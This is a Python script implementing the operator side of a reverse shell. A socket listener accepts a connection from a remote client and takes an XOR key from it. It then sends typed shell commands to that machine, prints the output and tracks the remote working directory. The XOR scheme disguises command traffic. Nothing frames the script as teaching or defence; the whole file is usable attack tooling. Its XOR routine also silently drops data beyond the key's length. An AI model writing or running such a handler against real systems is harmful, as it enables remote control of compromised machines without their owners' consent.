from socket import socket, AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET


class Listener:
    def __init__(self, ip, port):

        self.listener = socket(AF_INET, SOCK_STREAM)
        self.listener.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        self.listener.bind((ip, port))
        self.listener.listen(0)
        print("[+] Listening for coming connections on PORT: ", str(port))
        try:
            self.connection, address = self.listener.accept()
        except KeyboardInterrupt:
            exit("\nEXITING..")
        print("[+] New connection from " + str(address))
        self.key = self.connection.recv(1024).decode()
        self.cwd = self.x_recv()

    def str_xor(self, s1, s2):
        enc = "".join([chr(ord(c1) ^ ord(c2)) for (c1, c2) in zip(s1, s2)])
        return enc

    def x_send(self, msg):
        encrypted = ""
        if (len(msg) > 1024):
            for i in range(0, len(msg), 1024):
                chunk = msg[0+i:1024+i]
                encrypted += self.str_xor(chunk, self.key)
            encrypted = encrypted.encode()
        else:
            encrypted = self.str_xor(msg, self.key).encode()
        encrypted += "done".encode()
        self.connection.send(encrypted)

    def x_recv(self):
        data = "".encode()
        while not data.endswith("done".encode()):
            data += self.connection.recv(1024)
        data = data[:-4]
        data = data.decode()
        decrypted = ""
        if len(data) > 1024:
            for i in range(0, len(data), 1024):
                chunk = data[i+0:i+1024]
                decrypted += self.str_xor(chunk, self.key)
        else:
            decrypted = self.str_xor(data, self.key)
        return decrypted

    def run(self):

        while True:
            try:
                cmd = str(input(self.cwd + '>'))
                if (len(cmd.strip()) < 1):
                    self.run()
                self.x_send(cmd)
                r = self.x_recv()
                if cmd.split()[0] == 'cd' and len(cmd.split()) > 1:
                    self.cwd = r
                else:
                    print(r)
            except KeyboardInterrupt:
                self.x_send("terminate")
                self.connection.close()
                exit()


listener = Listener("localhost", 5000)
listener.run()
